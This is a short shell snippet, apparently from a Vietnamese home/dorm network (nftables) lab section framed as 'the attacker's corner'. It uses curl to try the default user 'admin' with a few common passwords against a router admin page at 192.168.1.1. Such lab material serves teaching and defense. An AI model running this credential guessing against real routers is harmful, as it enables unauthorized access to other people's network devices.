# 14.6 · góc kẻ xấu — ai cùng mạng nhà / ký túc xá (nft-lap) thử trang quản trị router: tên đăng nhập mặc định, vài mật khẩu hay gặp
U=admin
curl -s -o /dev/null -w "khong dang nhap: HTTP %{http_code}\n" http://192.168.1.1/
for p in 1234 12345678 "$U"; do curl -s -o /dev/null -w "$U / $p: HTTP %{http_code}\n" -u "$U:$p" http://192.168.1.1/; done
curl -s -u "$U:$U" http://192.168.1.1/
